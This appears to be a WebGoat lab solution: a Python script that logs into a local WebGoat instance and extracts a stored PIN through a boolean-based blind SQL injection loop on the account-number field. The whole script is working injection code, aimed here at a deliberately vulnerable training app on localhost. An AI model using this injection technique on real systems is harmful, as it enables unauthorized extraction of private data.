import requests
from bs4 import BeautifulSoup as bs

with requests.session() as s:
    params = {'username': 'guest', 'password': 'guest'}     #ID, PW 입력
    
    response = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data=params)         #로그인 사이트
    
    for x in range(3000, 0, -1):
        input_value = {'account_number' : "101 and (select pin from pins where cc_number='1111222233334444') >= " + str(x), 'SUBMIT' : 'Go!'}
        input_I = s.post('http://127.0.0.1:8080/WebGoat/attack?Screen=586116895&menu=1100', data=input_value)
        in_html = input_I.text
        in_soup = bs(in_html, 'html.parser')
        
        if str(in_soup.select('p')[1]) == '<p>Account number is valid.</p>':
            print("결과 : ",x)
            break

